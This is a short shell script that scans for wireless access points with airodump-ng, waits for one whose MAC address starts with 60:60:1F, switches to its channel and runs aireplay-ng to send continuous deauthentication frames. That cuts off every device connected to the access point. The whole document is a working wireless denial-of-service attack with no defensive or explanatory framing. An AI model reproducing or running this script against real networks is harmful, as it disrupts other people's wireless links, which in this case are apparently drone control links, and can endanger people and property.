#!/bin/sh

	ifconfig wlan0 down
	tput setaf 1;   echo "Succesfully took down wireless card.$(tput sgr 0)"
	xterm -hold -e airodump-ng -w dump wlan0 & tput setaf 3; echo "Searching for APs...$(tput sgr 0)"	# Scan for APs
	i=0
	while [ $i -eq 0 ]
	do
		apMAC=$(grep -m 1 -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
		apCh=$(grep -m 1 -E "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv | cut -d "," -f 4)
	# Search and trim MAC
		ap1stHalf=$(echo $apMAC | cut -c 1-9)	

		if [ "$ap1stHalf" = "60:60:1F:" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
			tput setaf 1; echo "Target AP Found!$(tput sgr 0)"
			echo $apMAC
			i=1
			kill $(ps -e | grep "airodump-ng" | awk '{print $1}') 		
		fi	# If MAC not found, search again
	done
	echo $apCh
	iwconfig wlan0 channel $apCh
	aireplay-ng -0 0 -a $apMAC wlan0	# If MAC found, deauthenticate all devices


